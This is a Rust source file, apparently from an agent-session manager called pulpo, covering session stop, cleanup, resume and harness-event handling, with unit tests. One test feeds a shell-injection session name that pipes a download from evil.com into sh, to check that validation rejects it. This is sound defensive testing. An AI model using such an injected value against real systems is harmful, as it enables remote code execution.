    /// the same moment the agent does — a session either resolves straight to `Done`
    /// the next time anything checks it here, or (for a harness-driven session) the
    /// harness's own `SessionEnded` hook gets there first (see `apply_harness_event`).
    /// `Done` is a true terminal status now: nothing re-checks its backend's liveness.
    ///
    /// This is the *lazy* path — driven by the next `get_session`/`list_sessions`
    /// call, which could be arbitrarily far in the future for a session nobody is
    /// polling. The watchdog's idle-check tick (`watchdog::idle::check_session_idle`)
    /// calls the same [`resolve_dead_backend_session`] eagerly, every tick, so a
    /// dead backend is resolved — and its `lifecycle` event/webhook fired — within
    /// one tick even with no API traffic at all.
    async fn check_and_mark_stale(&self, session: &mut Session) -> Result<Option<SessionStatus>> {
        if !matches!(
            session.status,
            SessionStatus::Working | SessionStatus::Waiting
        ) {
            return Ok(None);
        }
        // Grace period: skip staleness check for recently created sessions to avoid a
        // race where `is_alive()` returns false before tmux is fully ready.
        let age = Utc::now() - session.created_at;
        if age.num_seconds() < self.stale_grace_secs {
            return Ok(None);
        }
        let backend_id = self.resolve_backend_id(session);
        let alive = self.backend.is_alive(&backend_id)?;
        if alive {
            return Ok(None);
        }
        let previous = session.status;
        let transitioned =
            resolve_dead_backend_session(&self.store, self.backend.as_ref(), &backend_id, session)
                .await?;
        Ok(transitioned.then_some(previous))
    }

    /// Stop a session (`POST /api/v1/sessions/{id}/stop`, `pulpo stop`). Returns
    /// `Ok(true)` when the session was already `Done`/`Lost` by the time this call
    /// settles — either it already was at the start (a no-op on status — see
    /// below — the API maps this to `200 OK` so the CLI can print "already done"
    /// instead of "stopped"), or a concurrent caller (the watchdog's own eager
    /// dead-backend sweep, racing the fact that killing the backend below just
    /// made `is_alive()` false) won the race to resolve it first. `Ok(false)`
    /// only when this call is the one that actually performed the transition
    /// (mapped to `204 No Content`).
    ///
    /// A session already `Done`/`Lost` skips the backend-kill attempt and
    /// `mark_session_stopped` entirely: `mark_session_stopped` unconditionally
    /// overwrites `status_reason` with the generic `stopped`, which would destroy
    /// a more specific reason already recorded (`exited`, `budget_exceeded`, an
    /// idle-timeout code, ...) — a `pulpo stop` on a session that finished on its
    /// own a moment ago must not erase *why* it finished. `--purge` still runs
    /// regardless — it's independent cleanup (the same helper `pulpo rm`/`pulpo
    /// cleanup` use), not a status transition.
    pub async fn stop_session(&self, id: &str, purge: bool) -> Result<bool> {
        let mut session = self
            .store
            .get_session(id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {id}"))?;

        let already_terminal = matches!(session.status, SessionStatus::Done | SessionStatus::Lost);
        let mut report_already_terminal = already_terminal;

        if !already_terminal {
            let backend_id = self.resolve_backend_id(&session);
            self.stop_session_backend(&session, &backend_id)?;
            let transitioned = self.mark_session_stopped(&mut session).await?;

            if transitioned {
                // Same reasoning as the `SessionEnded` hook path above: an explicit
                // `pulpo stop` is another transition into a terminal status the
                // idle-sweep loop never revisits, so it's another place a session
                // could otherwise keep reporting no final cost.
                crate::watchdog::refresh_exact_usage(&self.store, &session).await;
            } else {
                // Lost the race: killing the backend just above made `is_alive()`
                // false, and a concurrent caller (the watchdog's own eager
                // dead-backend sweep) beat this call's own CAS to resolving the
                // session — most likely to `Lost`, since nothing else was
                // supposed to be racing a `pulpo stop`. Re-read the session's
                // real, current state rather than reporting this call as the one
                // that "stopped" it: the API/CLI must say `lost`, not `stopped`,
                // for a session that actually crashed out from under this call.
                if let Some(fresh) = self.store.get_session(id).await? {
                    session = fresh;
                }
                report_already_terminal = true;
            }
        }

        if purge {
            self.purge_session(&session).await?;
        }

        Ok(report_already_terminal)
    }

    pub async fn cleanup_dead_sessions(&self) -> Result<CleanupResponse> {
        let data_dir = self.store.data_dir().to_owned();
        let dead_sessions = self.store.fetch_dead_sessions().await?;

        let mut worktrees_cleaned = 0u64;
        let mut logs_cleaned = 0u64;

        // 1. Reclaim worktrees + per-session log files for dead (stopped/lost) sessions.
        //    A worktree shared with another still-live session (via `pulpo handoff`)
        //    is left alone — it's reclaimed once every referencing session is dead.
        for session in &dead_sessions {
            if let Some(ref wt_path) = session.worktree_path {
                let sid = session.id.to_string();
                if self.store.worktree_in_use_elsewhere(wt_path, &sid).await? {
                    tracing::debug!(
                        session = %session.name,
                        path = %wt_path,
                        "Skipping worktree cleanup — still referenced by another session"
                    );
                } else {
                    cleanup_worktree(wt_path, &session.workdir);
                    worktrees_cleaned += 1;
                }
            }
            if remove_session_log(&data_dir, &session.id.to_string()) {
                logs_cleaned += 1;
            }
            if remove_exit_markers(&data_dir, &session.id.to_string()) {
                logs_cleaned += 1;
            }
            cleanup_harness_dir(&data_dir, &session.id.to_string());
        }
        let ids: Vec<String> = dead_sessions.iter().map(|s| s.id.to_string()).collect();
        if !ids.is_empty() {
            self.store.delete_sessions_bulk(&ids).await?;
            for session in &dead_sessions {
                self.emit_session_deleted(session);
            }
        }

        // 2. Safe orphan sweep: directories and log files left behind by sessions that
        //    are no longer in the database at all. A still-referenced session (any
        //    status, including active/idle/ready) is never touched.
        let remaining = self.store.list_sessions().await.unwrap_or_default();
        let referenced_worktrees: HashSet<String> = remaining
            .iter()
            .filter_map(|s| s.worktree_path.clone())
            .collect();
        let known_ids: HashSet<String> = remaining.iter().map(|s| s.id.to_string()).collect();

        for dir in find_orphan_worktree_dirs(&worktrees_dir(&data_dir), &referenced_worktrees) {
            match std::fs::remove_dir_all(&dir) {
                Ok(()) => {
                    tracing::info!(path = %dir.display(), "Removed orphaned worktree directory");
                    worktrees_cleaned += 1;
                }
                Err(e) => {
                    tracing::warn!(path = %dir.display(), error = %e, "Failed to remove orphaned worktree");
                }
            }
        }
        let logs_dir = std::path::Path::new(&data_dir).join("logs");
        for log in find_orphan_session_logs(&logs_dir, &known_ids) {
            if std::fs::remove_file(&log).is_ok() {
                logs_cleaned += 1;
            }
        }
        for marker in find_orphan_exit_markers(&exit_dir(&data_dir), &known_ids) {
            if std::fs::remove_file(&marker).is_ok() {
                logs_cleaned += 1;
            }
        }

        Ok(CleanupResponse {
            sessions_deleted: dead_sessions.len() as u64,
            worktrees_cleaned,
            logs_cleaned,
        })
    }

    pub fn capture_output(&self, id: &str, backend_id: &str, lines: usize) -> String {
        self.backend
            .capture_output(backend_id, lines)
            .unwrap_or_else(|_| self.read_log_tail(id, lines))
    }

    fn read_log_tail(&self, id: &str, lines: usize) -> String {
        crate::session::utils::read_log_tail(self.store.data_dir(), id, lines)
    }

    pub fn send_input(&self, backend_id: &str, text: &str) -> Result<()> {
        self.backend.send_input(backend_id, text)
    }

    pub async fn resume_session(&self, id: &str) -> Result<Session> {
        let session = self
            .store
            .get_session(id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {id}"))?;

        let previous_status = session.status;
        if previous_status != SessionStatus::Lost && previous_status != SessionStatus::Done {
            bail!(
                "session cannot be resumed (status: {previous_status}) — only done or lost sessions can be resumed"
            );
        }

        // Historical docker-runtime sessions remain readable but cannot be resumed.
        if session.runtime == Runtime::Docker {
            bail!("{DOCKER_RUNTIME_REMOVED} — historical docker sessions cannot be resumed");
        }

        // Check for name collision with another live session (exclude self)
        if self
            .store
            .has_active_session_by_name_excluding(&session.name, Some(&session.id.to_string()))
            .await?
        {
            bail!(
                "another session named '{}' is already active — stop it first before resuming",
                session.name
            );
        }

        // Use worktree path as workdir if it still exists, otherwise fall back to original workdir.
        let effective_workdir = Self::effective_resume_workdir(&session);
        validate_workdir(&effective_workdir)?;

        // A `Done`/`Lost` session's backend should already be dead — that's precisely
        // how it got here (see `check_and_mark_stale`/`resolve_dead_backend_session`,
        // and `Lost` by definition). ADR 0009 removes the old `Ready`-with-alive-shell
        // special case (`wrap_command` no longer keeps a fallback shell running after
        // the agent exits, so that multi-second window is gone) — but two distinct
        // cases remain if the backend somehow answers alive anyway:
        //   - `Done`: a millisecond-scale race where a harness's own `SessionEnded`
        //     event flipped the status before its wrapper shell actually finished
        //     exiting. There's no live agent left to just "un-pause" — best-effort
        //     kill the dying backend, then always recreate fresh.
        //   - `Lost`: no exit marker ever suggested this backend should be dead, so
        //     if it answers alive, it's safe (and cheaper) to just resume it in
        //     place rather than tear down and restart a session that never actually
        //     stopped running.
        let backend_id = self.resolve_backend_id(&session);
        let alive = self.backend.is_alive(&backend_id)?;
        if previous_status == SessionStatus::Done || !alive {
            if alive {
                let _ = self.backend.kill_session(&backend_id);
            }
            // Use session name for the new tmux session, not the stale $N backend
            // ID. The old backend_session_id may point to a dead tmux session that
            // no longer exists.
            let create_id = self.resume_create_id(&session);
            self.restore_session_backend(&session, &effective_workdir, &create_id)
                .await?;
        }

        let mut session = session;
        self.mark_session_status(&mut session, previous_status, SessionStatus::Working)
            .await?;
        Ok(session)
    }

    /// Resume all sessions that were `Working`/`Waiting` but have dead backends,
    /// and resolve any row stuck in `Starting` (the daemon crashed between insert
    /// and `finalize_created_session`) whose backend is dead too. Called on
    /// startup to recover sessions lost during a reboot.
    ///
    /// There is no `Ready`-equivalent case to eagerly reclassify anymore (ADR 0009):
    /// `Done` is a true terminal status now (nothing re-checks a `Done` session's
    /// backend — see [`Self::check_and_mark_stale`]).
    /// Returns the number of sessions successfully resumed (`Starting` rows are
    /// resolved, never counted as "resumed" — there is no known-good command
    /// state to relaunch for a session that may never have actually started).
    pub async fn resume_lost_sessions(&self) -> Result<usize> {
        let sessions = self.store.list_sessions().await?;
        let mut resumed = 0;
        for mut session in sessions {
            if session.status == SessionStatus::Starting {
                // Unreachable by every other path: `check_and_mark_stale` only
                // ever checks `Working`/`Waiting`, and `remove_session` used to
                // refuse `Starting` outright — this row would otherwise block
                // its name via `idx_sessions_live_name` forever. Resolve it the
                // same way a dead `Working`/`Waiting` backend is (`Done` if an
                // exit marker happens to exist, `Lost` otherwise); a backend
                // that IS alive means this is a session still legitimately
                // mid-creation, so leave it alone.
                let backend_id = self.resolve_backend_id(&session);
                if !self.backend.is_alive(&backend_id).unwrap_or(false)
                    && resolve_dead_backend_session(
                        &self.store,
                        self.backend.as_ref(),
                        &backend_id,
                        &mut session,
                    )
                    .await
                    .unwrap_or(false)
                {
                    crate::watchdog::refresh_exact_usage(&self.store, &session).await;
                }
                continue;
            }
            if session.status != SessionStatus::Working && session.status != SessionStatus::Waiting
            {
                continue;
            }
            // The docker runtime was removed — historical docker sessions cannot be
            // auto-resumed in tmux. Mark them Lost so they surface in the dashboard.
            if session.runtime == Runtime::Docker {
                tracing::warn!(
                    session = %session.name,
                    "Cannot auto-resume docker-runtime session — {DOCKER_RUNTIME_REMOVED}"
                );
                self.store
                    .update_session_status(&session.id.to_string(), SessionStatus::Lost, None)
                    .await?;
                crate::watchdog::refresh_exact_usage(&self.store, &session).await;
                continue;
            }
            let backend_id = self.resolve_backend_id(&session);
            let alive = self.backend.is_alive(&backend_id).unwrap_or(false);
            if alive {
                continue;
            }
            // The session ended cleanly while the daemon wasn't polling it (either it
            // exited before pulpod stopped, or after — the marker is written by the
            // wrapper shell itself, independent of daemon uptime). Resolve it to
            // `Done` instead of blindly auto-resuming (re-launching the original
            // command) — this must be checked *before* the resume attempt below.
            if has_exit_marker(self.store.data_dir(), &session.id.to_string()) {
                resolve_dead_backend_session(
                    &self.store,
                    self.backend.as_ref(),
                    &backend_id,
                    &mut session,
                )
                .await?;
                continue;
            }
            // Backend is dead — resume the session. Use the session name for the new
            // tmux session, not the stale $N backend ID (see resume_session above —
            // the old backend_session_id may point to a dead tmux session that no
            // longer exists, and reusing it verbatim as the new session's *name*
            // produces tmux sessions literally named "$4", "$5", etc. after a reboot).
            let effective_workdir = Self::effective_resume_workdir(&session);
            // Same guard `resume_session` applies: a worktree/workdir that vanished
            // out from under a session (branch deleted, disk wiped, ...) must not be
            // silently auto-resumed into a broken tmux session on startup — mark it
            // Lost instead, matching every other auto-resume failure path below.
            if let Err(error) = validate_workdir(&effective_workdir) {
                tracing::warn!(
                    session = %session.name,
                    %error,
                    "Cannot auto-resume session: invalid workdir"
                );
                self.store
                    .update_session_status(&session.id.to_string(), SessionStatus::Lost, None)
                    .await?;
                crate::watchdog::refresh_exact_usage(&self.store, &session).await;
                continue;
            }
            let create_id = self.resume_create_id(&session);
            if let Err(e) = self
                .restore_session_backend(&session, &effective_workdir, &create_id)
                .await
            {
                tracing::warn!(
                    session = %session.name,
                    error = %e,
                    "Failed to auto-resume session on startup"
                );
                self.store
                    .update_session_status(&session.id.to_string(), SessionStatus::Lost, None)
                    .await?;
                crate::watchdog::refresh_exact_usage(&self.store, &session).await;
                continue;
            }

            // Re-mark as Working
            self.store
                .update_session_status(&session.id.to_string(), SessionStatus::Working, None)
                .await?;
            tracing::info!(session = %session.name, "Auto-resumed session after restart");
            resumed += 1;
        }
        Ok(resumed)
    }

    /// Ingest a harness lifecycle event (posted by `pulpo hook <harness>` via
    /// `POST /api/v1/sessions/{id}/harness-events`): resolve the session's adapter,
    /// translate the raw payload into a normalized event, apply the state
    /// transition, and emit the existing SSE `session` event. Notifications for
    /// `NeedsInput`/`Failed` reuse that same event — no new channel.
    ///
    /// `harness_id` is the request body's own `harness` field — untrusted client
    /// input, never used to resolve the adapter directly. It must match the
    /// session's own stored `harness` (set once, at spawn time) or the request is
    /// rejected: a mismatched/spoofed `harness` would otherwise run the wrong
    /// adapter's `parse_event` against this session's payload, and `session.harness`
    /// itself must never be overwritten by what a client claims in the request body.
    ///
    /// A session already in a terminal status (`Stopped`/`Lost`) ignores the event
    /// entirely — touches nothing, returns `Ok(())` — a hook can fire after the
    /// harness process (and pulpo's own bookkeeping for it) is already done, and
    /// that's expected/racy, not an error.
    pub async fn apply_harness_event(
        &self,
        session_id: &str,
        harness_id: &str,
        raw_event: &serde_json::Value,
    ) -> Result<()> {
        let mut session = self
            .store
            .get_session(session_id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {session_id}"))?;

        if matches!(session.status, SessionStatus::Done | SessionStatus::Lost) {
            return Ok(());
        }

        let adapter = self
            .harness_registry
            .get(harness_id)
            .ok_or_else(|| anyhow!("unknown harness: {harness_id}"))?;

        if session.harness.as_deref() != Some(harness_id) {
            bail!(
                "harness mismatch: session {session_id} is harness {:?}, request claims {harness_id:?}",
                session.harness
            );
        }

        let session_id_str = session.id.to_string();
        self.store
            .touch_harness_last_event_at(&session_id_str)
            .await?;
        session.harness_last_event_at = Some(Utc::now());

        let Some(event) = adapter.parse_event(raw_event)? else {
            return Ok(());
        };

        let update = harness::transition_for_event(&event);
        let previous_status = session.status;

        if update.harness_session_id.is_some() {
            self.store
                .update_session_harness(
                    &session_id_str,
                    adapter.id(),
                    update.harness_session_id.as_deref(),
                )
                .await?;
            session
                .harness_session_id
                .clone_from(&update.harness_session_id);
        }

        if !update.metadata_set.is_empty() || !update.metadata_clear.is_empty() {
            let sets: Vec<(&str, &str)> = update
                .metadata_set
                .iter()
                .map(|(key, value)| (*key, value.as_str()))
                .collect();
            self.store
                .batch_update_session_metadata(&session_id_str, &sets, &update.metadata_clear)
                .await?;
            if let Ok(Some(refreshed)) = self.store.get_session(&session_id_str).await {
                session.metadata = refreshed.metadata;
            }
        }

        if update.set_idle_since {
            self.store
                .update_session_idle_since(&session_id_str)
                .await?;
            session.idle_since = Some(Utc::now());
        }

        if let Some(status) = update.status {
            self.store
                .update_session_status(&session_id_str, status, update.status_reason.as_deref())
                .await?;
            session.status = status;
            session.status_reason.clone_from(&update.status_reason);
        }

        if update.notify {
            tracing::info!(
                session = %session.name,
                harness = adapter.id(),
                status = %session.status,
                "harness event needs attention"
            );
        }

        // `SessionEnded` itself never sets `update.status` (see
        // `harness::transition_for_event`'s doc comment) — the harness process is
        // only just starting to exit. Best-effort: read the `.code` exit marker
        // (which can race `wrap_command` writing it, since the marker only appears
        // once the wrapped process actually terminates); when it's already there,
        // record `exit_code` now and transition straight to `Done` (reason `exited`)
        // instead of waiting for the ordinary dead-backend classification
        // (`check_and_mark_stale`/`resolve_dead_backend_session`, driven by the next
        // `get_session`/`list_sessions` call) to catch it once the backend actually
        // dies. When the marker isn't there yet, leave the status alone — that later
        // dead-backend check remains the durable path.
        if matches!(event, harness::HarnessEvent::SessionEnded { .. }) {
            let data_dir = self.store.data_dir();
            let exit_code = if session.exit_code.is_none() {
                read_exit_code_marker(data_dir, &session_id_str)
            } else {
                None
            };

            // The final exact-usage reconciliation (#127): a `SessionEnded` hook is a
            // terminal-ish moment the watchdog's idle-sweep loop no longer visits for
            // cost refreshes (it only ever checks `Working`/`Waiting` sessions).
            // Without this, a session whose harness reports it's done before the next
            // watchdog tick would see its final `session_cost_usd` never recorded.
            crate::watchdog::refresh_exact_usage(&self.store, &session).await;

            if has_exit_marker(data_dir, &session_id_str) {
                // Compare-and-set, `exit_code` folded directly into the same
                // atomic write (`COALESCE`d against any existing value — see
                // `transition_to_terminal_if_live`'s doc comment): a concurrent
                // caller (the watchdog's own eager dead-backend sweep, or a
                // `GET`/`list_sessions` racing this hook) may have already
                // resolved this session first. `Ok(false)` means it did —
                // return immediately rather than fall through to the
                // unconditional `emit_event` below, which would otherwise emit
                // a duplicate `lifecycle` event and clobber whatever more
                // specific status/reason that concurrent winner just set.
                let transitioned = self
                    .store
                    .transition_to_terminal_if_live(
                        &session_id_str,
                        SessionStatus::Done,
                        Some(status_reason::EXITED),
                        exit_code,
                    )
                    .await?;
                if !transitioned {
                    return Ok(());
                }
                if let Some(code) = exit_code {
                    session.exit_code = Some(code);
                }
                session.status = SessionStatus::Done;
                session.status_reason = Some(status_reason::EXITED.to_owned());
            }
        }

        session.updated_at = Utc::now();
        self.emit_event(&session, Some(previous_status));

        Ok(())
    }

    pub const fn store(&self) -> &Store {
        &self.store
    }
}

/// Resolve a session whose backend has been found dead — shared by
/// `SessionManager::check_and_mark_stale` (the lazy path: driven by the next
/// `get_session`/`list_sessions` call), `SessionManager::resume_lost_sessions`
/// (driven at startup), and `watchdog::idle::check_session_idle` (the eager
/// path: every watchdog tick, so a dead backend is resolved — and its
/// `lifecycle` event/webhook fired — without depending on anyone polling the
/// API at all; see ADR 0009's HIGH follow-up fixing the watchdog no longer
/// doing this itself after the `Ready`-sweep removal).
///
/// Resolves to `Done` (reason `exited`, clean end per an exit marker) or `Lost`
/// (no evidence of a clean end), persisting `exit_code` when the `.code` marker
/// parsed to a number, and running the final exact-usage reconciliation (#127)
/// so a session's last `session_cost_usd` is never left unrecorded just because
/// it finished between watchdog ticks.
///
/// Also best-effort-preserves the session's final output, which would otherwise
/// be lost the instant the pane closes (`wrap_command` no longer keeps a
/// fallback shell open — ADR 0009): first a live tmux capture attempt (the
/// backend *server* may still be up even though this one session's pane just
/// died, and a capture racing the teardown occasionally still succeeds), then,
/// for the `Done`/clean-exit case specifically, the per-session pipe-pane log
/// (`{id}.log`, written continuously while the pane was alive whenever
/// `capture_session_output` is enabled) — the reliable source once the live
/// capture above has (as it almost always does for a session that closed
/// cleanly) come back empty.
/// Returns `Ok(true)` only when this call is the one that actually transitioned
/// the session (a concurrent caller — the watchdog's own eager `is_alive()`
/// check racing a `GET`/`list_sessions` call, or vice versa — may have already
/// resolved it first). Callers must treat `Ok(false)` as "skip emitting a
/// lifecycle event for this call, it would be a duplicate," not as a no-op to
/// retry. `session` is mutated to reflect the new state only when this
/// returns `Ok(true)`; on `Ok(false)` it's left as passed in (the DB is the
/// source of truth for what the concurrent winner actually set).
pub(crate) async fn resolve_dead_backend_session(
    store: &Store,
    backend: &dyn Backend,
    backend_id: &str,
    session: &mut Session,
) -> Result<bool> {
    let id = session.id.to_string();
    let data_dir = store.data_dir();

    if let Ok(output) = backend.capture_output(backend_id, 500)
        && !output.is_empty()
    {
        let _ = store.update_session_output_snapshot(&id, &output).await;
        session.output_snapshot = Some(output);
    }

    if has_exit_marker(data_dir, &id) {
        let exit_code = read_exit_code_marker(data_dir, &id);
        // The live capture above almost never has anything for a session that
        // ended cleanly — tmux tears the pane down the instant the wrapped
        // command exits. The pipe-pane log is the reliable fallback here.
        let tail = crate::session::utils::read_log_tail(data_dir, &id, 500);
        if !tail.is_empty() {
            let _ = store.update_session_output_snapshot(&id, &tail).await;
            session.output_snapshot = Some(tail);
        }
        let transitioned = store
            .transition_to_terminal_if_live(
                &id,
                SessionStatus::Done,
                Some(status_reason::EXITED),
                exit_code,
            )
            .await?;
        if !transitioned {
            return Ok(false);
        }
        if let Some(code) = exit_code {
            session.exit_code = Some(code);
        }
        session.status = SessionStatus::Done;
        session.status_reason = Some(status_reason::EXITED.to_owned());
        crate::watchdog::refresh_exact_usage(store, session).await;
    } else {
        let transitioned = store
            .transition_to_terminal_if_live(&id, SessionStatus::Lost, None, None)
            .await?;
        if !transitioned {
            return Ok(false);
        }
        session.status = SessionStatus::Lost;
        session.status_reason = None;
        // #127 follow-up: `Lost` never reconciled cost before this — after a
        // reboot (or any other path landing here without an exit marker),
        // every `Lost` session showed no final cost even when its transcript
        // had the data all along. Mirrors the `Done` branch's own call above.
        crate::watchdog::refresh_exact_usage(store, session).await;
    }
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::session::utils::{exit_clean_marker_path, exit_code_marker_path};
    use pulpo_common::event::SessionEvent;
    use std::sync::Mutex;

    /// Extract the inner `SessionEvent` from a `PulpoEvent`.
    fn unwrap_session_event(event: PulpoEvent) -> SessionEvent {
        match event {
            PulpoEvent::Session(se) => se,
            PulpoEvent::SessionDeleted(_)
            | PulpoEvent::UsageAlert(_)
            | PulpoEvent::Intervention(_)
            | PulpoEvent::Daemon(_) => {
                panic!("expected session event")
            }
        }
    }

    struct MockBackend {
        create_result: Mutex<Result<()>>,
        kill_result: Mutex<Result<()>>,
        alive: Mutex<bool>,
        captured_output: Mutex<String>,
        calls: Mutex<Vec<String>>,
        /// Optional hook run synchronously, exactly once, from inside
        /// `kill_session` — before it returns — so a test can deterministically
        /// land a competing state change in the real gap between
        /// `stop_session`'s backend kill and its own post-kill CAS, without any
        /// timing-dependent race. See
        /// `test_stop_session_reports_lost_when_backend_dies_concurrently_mid_stop`.
        on_kill: Mutex<Option<Box<dyn FnOnce() + Send>>>,
    }

    impl MockBackend {
        fn new() -> Self {
            Self {
                create_result: Mutex::new(Ok(())),
                kill_result: Mutex::new(Ok(())),
                alive: Mutex::new(true),
                captured_output: Mutex::new("test output".into()),
                calls: Mutex::new(vec![]),
                on_kill: Mutex::new(None),
            }
        }

        fn with_create_error(self) -> Self {
            *self.create_result.lock().unwrap() = Err(anyhow!("backend not found"));
            self
        }

        fn with_kill_error(self) -> Self {
            *self.kill_result.lock().unwrap() = Err(anyhow!("kill failed"));
            self
        }

        fn with_alive(self, alive: bool) -> Self {
            *self.alive.lock().unwrap() = alive;
            self
        }

        fn with_on_kill(self, hook: Box<dyn FnOnce() + Send>) -> Self {
            *self.on_kill.lock().unwrap() = Some(hook);
            self
        }
    }

    impl Backend for MockBackend {
        fn create_session(&self, name: &str, working_dir: &str, command: &str) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("create:{name}:{working_dir}:{command}"));
            let mut result = self.create_result.lock().unwrap();
            std::mem::replace(&mut *result, Ok(()))
        }

        fn kill_session(&self, name: &str) -> Result<()> {
            if let Some(hook) = self.on_kill.lock().unwrap().take() {
                hook();
            }
            self.calls.lock().unwrap().push(format!("kill:{name}"));
            let mut result = self.kill_result.lock().unwrap();
            std::mem::replace(&mut *result, Ok(()))
        }

        fn is_alive(&self, name: &str) -> Result<bool> {
            self.calls.lock().unwrap().push(format!("is_alive:{name}"));
            Ok(*self.alive.lock().unwrap())
        }

        fn capture_output(&self, name: &str, lines: usize) -> Result<String> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("capture:{name}:{lines}"));
            Ok(self.captured_output.lock().unwrap().clone())
        }

        fn send_input(&self, name: &str, text: &str) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("send_input:{name}:{text}"));
            Ok(())
        }

        fn setup_logging(&self, name: &str, log_path: &str) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("setup_logging:{name}:{log_path}"));
            Ok(())
        }

        fn query_backend_id(&self, name: &str) -> anyhow::Result<String> {
            Ok(format!("${}", name.len()))
        }
    }

    struct FailCapture;
    impl Backend for FailCapture {
        fn create_session(&self, _: &str, _: &str, _: &str) -> Result<()> {
            Ok(())
        }
        fn kill_session(&self, _: &str) -> Result<()> {
            Ok(())
        }
        fn is_alive(&self, _: &str) -> Result<bool> {
            Ok(true)
        }
        fn capture_output(&self, _: &str, _: usize) -> Result<String> {
            Err(anyhow!("session not alive"))
        }
        fn send_input(&self, _: &str, _: &str) -> Result<()> {
            Ok(())
        }
        fn setup_logging(&self, _: &str, _: &str) -> Result<()> {
            Ok(())
        }
    }

    async fn test_manager(
        backend: MockBackend,
    ) -> (SessionManager, Arc<MockBackend>, sqlx::SqlitePool) {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let pool = store.pool().clone();
        let backend = Arc::new(backend);
        let manager = SessionManager::new(backend.clone(), store, None).with_no_stale_grace();
        (manager, backend, pool)
    }

    fn make_req(name: &str) -> CreateSessionRequest {
        CreateSessionRequest {
            name: name.to_owned(),
            workdir: Some("/tmp".into()),
            command: Some("echo hello".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
        }
    }

    #[tokio::test]
    async fn test_create_session_defaults() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("fix-the-bug")).await.unwrap();

        assert_eq!(session.name, "fix-the-bug");
        assert_eq!(session.command, "echo hello");
        assert_eq!(session.status, SessionStatus::Working);
        assert_eq!(session.workdir, "/tmp");
        // MockBackend.query_backend_id() returns $N where N is the name length
        assert_eq!(session.backend_session_id, Some("$11".into()));

        let calls = backend.calls.lock().unwrap();
        // All commands wrapped in bash -l -c for session survival
        assert!(calls[0].contains("-l -c"));
        assert!(calls[0].contains("echo hello"));
        // Output capture is off by default, so no setup_logging call is made.
        assert!(!calls.iter().any(|c| c.starts_with("setup_logging:")));
        assert_eq!(calls.len(), 1);
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_exports_configured_daemon_port() {
        // `with_daemon_port` must reach the wrapped command's `PULPO_URL` export —
        // how `pulpo hook` finds a daemon bound to a non-default `[node].port`.
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let mgr = mgr.with_daemon_port(9999);
        mgr.create_session(make_req("port-check")).await.unwrap();

        assert!(backend.calls.lock().unwrap()[0].contains("PULPO_URL=http://127.0.0.1:9999"));
    }

    #[tokio::test]
    async fn test_create_session_no_command_falls_back_to_shell() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        // Should fall back to $SHELL or /bin/sh
        assert!(!session.command.is_empty());
        let calls = backend.calls.lock().unwrap();
        assert!(calls[0].contains("-l -c"));
        drop(calls);
    }

    #[test]
    fn test_validate_session_name_valid() {
        assert!(validate_session_name("my-session").is_ok());
        assert!(validate_session_name("a").is_ok());
        assert!(validate_session_name("fix-auth-123").is_ok());
        assert!(validate_session_name("nightly-20260331-0300").is_ok());
    }

    #[test]
    fn test_validate_session_name_rejects_shell_injection() {
        let result = validate_session_name("x'; curl evil.com | sh; echo '");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("lowercase"));
    }

    #[test]
    fn test_validate_session_name_rejects_special_chars() {
        assert!(validate_session_name("").is_err());
        assert!(validate_session_name("Has Spaces").is_err());
        assert!(validate_session_name("UPPERCASE").is_err());
        assert!(validate_session_name("has.dots").is_err());
        assert!(validate_session_name("has:colons").is_err());
        assert!(validate_session_name("-leading-hyphen").is_err());
        assert!(validate_session_name("trailing-hyphen-").is_err());
    }

    #[test]
    fn test_validate_session_name_rejects_long_names() {
        let long = "a".repeat(129);
        assert!(validate_session_name(&long).is_err());
        let ok = "a".repeat(128);
        assert!(validate_session_name(&ok).is_ok());
    }

    #[test]
    fn test_wrap_command_escapes_session_name() {
        // Even if validation is bypassed, wrap_command should escape the name
        let id = uuid::Uuid::new_v4();
        let wrapped = wrap_command(
            "echo test",
            &id,
            "safe-name",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(wrapped.contains("PULPO_SESSION_NAME=safe-name"));
        // Verify single quotes in name would be escaped (defense-in-depth)
        let wrapped = wrap_command(
            "echo test",
            &id,
            "name'inject",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(!wrapped.contains("name'inject"));
        assert!(wrapped.contains("name'\\''inject"));
    }

    #[tokio::test]
    async fn test_create_session_rejects_invalid_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "bad name with spaces".into(),
            workdir: Some("/tmp".into()),
            command: Some("echo".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let err = mgr.create_session(req).await.unwrap_err().to_string();
        assert!(err.contains("lowercase"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_default_workdir() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "defaults-test".into(),
            workdir: None,
            command: Some("echo test".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
